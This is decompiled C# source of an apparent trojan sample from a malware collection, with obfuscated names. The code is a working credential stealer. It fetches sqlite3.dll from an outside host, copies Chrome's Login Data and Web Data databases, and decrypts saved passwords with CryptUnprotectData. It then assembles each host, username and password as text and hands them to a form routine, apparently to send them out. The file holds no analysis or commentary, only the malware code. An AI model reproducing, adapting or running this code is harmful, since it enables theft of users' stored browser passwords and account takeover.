// Decompiled with JetBrains decompiler
// Type: adfND.UoWWUNNamOqklECJPYkRz4gYAPKn9TO
// Assembly: adfND, Version=2.1.3.4, Culture=neutral, PublicKeyToken=null
// MVID: B39AC443-093C-4412-BE50-149A7E6ADFED
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan-Downloader.MSIL.Crypted.cd-b42cf5dc593d9380920439dace615ab045e5dfbae25773d3b63b45980d1d1942.exe

using adfND.My;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace adfND
{
  [StandardModule]
  internal sealed class UoWWUNNamOqklECJPYkRz4gYAPKn9TO
  {
    public static string NewLine = Environment.NewLine;
    public const string LineSplitter = " ";

    public static string bzjvSEmfqVnJ5WyKeCu1SafAp9FwC80()
    {
      string str1 = "";
      string[] strArray = new string[2]
      {
        "Login Data",
        "Web Data"
      };
      int index = 0;
      while (index < strArray.Length)
      {
        string str2 = strArray[index];
        string pathName = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\";
        if (File.Exists(pathName + str2))
        {
          if (!File.Exists(pathName + "sqlite3.dll"))
            MyProject.Computer.Network.DownloadFile("http://mahi.fileave.com/sqlite3.dll", pathName + "sqlite3.dll");
          UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SetDllDirectory(pathName);
          string str3 = pathName + Path.GetRandomFileName();
          MyProject.Computer.FileSystem.CopyFile(pathName + str2, str3);
          DataTable sqLiteTable = UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.GetSQLiteTable(str3, "logins");
          File.Delete(str3);
          UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SetDllDirectory((string) null);
          try
          {
            foreach (DataRow row in sqLiteTable.Rows)
            {
              string u = Conversions.ToString(row["origin_url"]);
              string str4 = Conversions.ToString(row["username_value"]);
              byte[] numArray1 = (byte[]) row["password_value"];
              UoWWUNNamOqklECJPYkRz4gYAPKn9TO.DATA_BLOB dataBlob1 = new UoWWUNNamOqklECJPYkRz4gYAPKn9TO.DATA_BLOB();
              UoWWUNNamOqklECJPYkRz4gYAPKn9TO.DATA_BLOB dataBlob2 = new UoWWUNNamOqklECJPYkRz4gYAPKn9TO.DATA_BLOB();
              GCHandle gcHandle = GCHandle.Alloc((object) numArray1, GCHandleType.Pinned);
              dataBlob1.pbData = (int) gcHandle.AddrOfPinnedObject();
              dataBlob1.cbData = numArray1.Length;
              gcHandle.Free();
              ref UoWWUNNamOqklECJPYkRz4gYAPKn9TO.DATA_BLOB local1 = ref dataBlob1;
              UoWWUNNamOqklECJPYkRz4gYAPKn9TO.DATA_BLOB dataBlob3;
              UoWWUNNamOqklECJPYkRz4gYAPKn9TO.DATA_BLOB dataBlob4 = dataBlob3;
              ref UoWWUNNamOqklECJPYkRz4gYAPKn9TO.DATA_BLOB local2 = ref dataBlob4;
              ref UoWWUNNamOqklECJPYkRz4gYAPKn9TO.DATA_BLOB local3 = ref dataBlob2;
              if (UoWWUNNamOqklECJPYkRz4gYAPKn9TO.CryptUnprotectData(ref local1, 0, ref local2, 0, 0, 0, ref local3))
              {
                byte[] numArray2 = new byte[checked (dataBlob2.cbData - 1 + 1)];
                Marshal.Copy((IntPtr) dataBlob2.pbData, numArray2, 0, dataBlob2.cbData);
                string str5 = Encoding.Default.GetString(numArray2);
                if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(str4, "", false) != 0 && Microsoft.VisualBasic.CompilerServices.Operators.CompareString(str5, "", false) != 0)
                {
                  str1 = str1 + " " + UoWWUNNamOqklECJPYkRz4gYAPKn9TO.NewLine + "Host : " + u + UoWWUNNamOqklECJPYkRz4gYAPKn9TO.NewLine + "Username : " + str4 + UoWWUNNamOqklECJPYkRz4gYAPKn9TO.NewLine + "Password : " + str5 + UoWWUNNamOqklECJPYkRz4gYAPKn9TO.NewLine + " " + UoWWUNNamOqklECJPYkRz4gYAPKn9TO.NewLine;
                  MyProject.Forms.UNNamOqklECJPYk.pPFBUwSOdPVCdM2k(2, u, str4, str5);
                }
              }
            }
          }
          finally
          {
            IEnumerator enumerator;
            if (enumerator is IDisposable)
              (enumerator as IDisposable).Dispose();
          }
        }
        checked { ++index; }
      }
      return str1;
    }

    [DllImport("crypt32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool CryptUnprotectData(
      ref UoWWUNNamOqklECJPYkRz4gYAPKn9TO.DATA_BLOB pDataIn,
      int ppszDataDescr,
      ref UoWWUNNamOqklECJPYkRz4gYAPKn9TO.DATA_BLOB pOptionalEntropy,
      int pvReserved,
      int pPromptStruct,
      int dwFlags,
      ref UoWWUNNamOqklECJPYkRz4gYAPKn9TO.DATA_BLOB pDataOut);

    [DllImport("kernel32.dll")]
    private static extern bool SetDllDirectory(string pathName);

    public class SQLiteWrapper
    {
      private const int SQL_OK = 0;
      private const int SQL_ROW = 100;

      [DebuggerNonUserCode]
      public SQLiteWrapper()
      {
      }

      [DllImport("sqlite3")]
      private static extern int sqlite3_open(IntPtr fileName, ref IntPtr database);

      [DllImport("sqlite3")]
      private static extern int sqlite3_close(IntPtr database);

      [DllImport("sqlite3")]
      private static extern int sqlite3_prepare(
        IntPtr database,
        IntPtr query,
        int length,
        ref IntPtr statement,
        ref IntPtr tail);

      [DllImport("sqlite3")]
      private static extern int sqlite3_step(IntPtr statement);

      [DllImport("sqlite3")]
      private static extern int sqlite3_column_count(IntPtr statement);

      [DllImport("sqlite3")]
      private static extern IntPtr sqlite3_column_name(IntPtr statement, int columnNumber);

      [DllImport("sqlite3")]
      private static extern int sqlite3_column_type(IntPtr statement, int columnNumber);

      [DllImport("sqlite3")]
      private static extern int sqlite3_column_int(IntPtr statement, int columnNumber);

      [DllImport("sqlite3")]
      private static extern double sqlite3_column_double(IntPtr statement, int columnNumber);

      [DllImport("sqlite3")]
      private static extern IntPtr sqlite3_column_text(IntPtr statement, int columnNumber);

      [DllImport("sqlite3")]
      private static extern IntPtr sqlite3_column_blob(IntPtr statement, int columnNumber);

      [DllImport("sqlite3")]
      private static extern int sqlite3_column_bytes(IntPtr statement, int columnNumber);

      [DllImport("sqlite3")]
      private static extern IntPtr sqlite3_column_table_name(
        IntPtr statement,
        int columnNumber);

      [DllImport("sqlite3")]
      private static extern int sqlite3_finalize(IntPtr handle);

      [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int lstrlenA(IntPtr lpString);

      public static DataTable GetSQLiteTable(string DBPath, string TableName)
      {
        string s = "SELECT * FROM " + TableName + ";";
        IntPtr database;
        if (!File.Exists(DBPath) || UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.sqlite3_open(Marshal.StringToHGlobalAnsi(DBPath), ref database) != 0)
          return new DataTable();
        IntPtr statement;
        IntPtr tail;
        UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.sqlite3_prepare(database, Marshal.StringToHGlobalAnsi(s), UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.lstrlenA(Marshal.StringToHGlobalAnsi(s)), ref statement, ref tail);
        DataTable table = new DataTable();
        int num = UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.ReadFirstRow(statement, ref table);
        while (num == 100)
          num = UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.ReadNextRow(statement, ref table);
        UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.sqlite3_finalize(statement);
        UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.sqlite3_close(database);
        return table;
      }

      private static int ReadFirstRow(IntPtr statement, ref DataTable table)
      {
        if (UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.sqlite3_step(statement) == 100)
        {
          int num1 = UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.sqlite3_column_count(statement);
          object[] objArray = new object[checked (num1 - 1 + 1)];
          int num2 = checked (num1 - 1);
          int columnNumber = 0;
          while (columnNumber <= num2)
          {
            string stringAnsi = Marshal.PtrToStringAnsi(UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.sqlite3_column_name(statement, columnNumber));
            switch (UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.sqlite3_column_type(statement, columnNumber))
            {
              case 1:
                table.Columns.Add(stringAnsi, typeof (int));
                objArray[columnNumber] = (object) UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.sqlite3_column_int(statement, columnNumber);
                break;
              case 2:
                table.Columns.Add(stringAnsi, typeof (float));
                objArray[columnNumber] = (object) UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.sqlite3_column_double(statement, columnNumber);
                break;
              case 3:
                table.Columns.Add(stringAnsi, typeof (string));
                objArray[columnNumber] = (object) Marshal.PtrToStringAnsi(UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.sqlite3_column_text(statement, columnNumber));
                break;
              case 4:
                table.Columns.Add(stringAnsi, typeof (byte[]));
                objArray[columnNumber] = (object) UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.PointerToByteArray(UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.sqlite3_column_blob(statement, columnNumber), UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.sqlite3_column_bytes(statement, columnNumber));
                break;
              default:
                table.Columns.Add(stringAnsi, typeof (object));
                objArray[columnNumber] = (object) null;
                break;
            }
            checked { ++columnNumber; }
          }
          table.Rows.Add(objArray);
        }
        return UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.sqlite3_step(statement);
      }

      private static int ReadNextRow(IntPtr statement, ref DataTable table)
      {
        int num1 = UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.sqlite3_column_count(statement);
        object[] objArray = new object[checked (num1 - 1 + 1)];
        int num2 = checked (num1 - 1);
        int columnNumber = 0;
        while (columnNumber <= num2)
        {
          switch (UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.sqlite3_column_type(statement, columnNumber))
          {
            case 1:
              objArray[columnNumber] = (object) UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.sqlite3_column_int(statement, columnNumber);
              break;
            case 2:
              objArray[columnNumber] = (object) UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.sqlite3_column_double(statement, columnNumber);
              break;
            case 3:
              objArray[columnNumber] = (object) Marshal.PtrToStringAnsi(UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.sqlite3_column_text(statement, columnNumber));
              break;
            case 4:
              objArray[columnNumber] = (object) UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.PointerToByteArray(UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.sqlite3_column_blob(statement, columnNumber), UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.sqlite3_column_bytes(statement, columnNumber));
              break;
            default:
              objArray[columnNumber] = (object) null;
              break;
          }
          checked { ++columnNumber; }
        }
        table.Rows.Add(objArray);
        return UoWWUNNamOqklECJPYkRz4gYAPKn9TO.SQLiteWrapper.sqlite3_step(statement);
      }

      private static byte[] PointerToByteArray(IntPtr ptr, int Length)
      {
        if (ptr == IntPtr.Zero | Length == 0)
          return new byte[0];
        byte[] destination = new byte[checked (Length - 1 + 1)];
        Marshal.Copy(ptr, destination, 0, Length);
        return destination;
      }

      private enum SQLiteDataTypes
      {
        INT = 1,
        FLOAT = 2,
        TEXT = 3,
        BLOB = 4,
        NULL = 5,
      }
    }

    private struct DATA_BLOB
    {
      public int cbData;
      public int pbData;
    }
  }
}
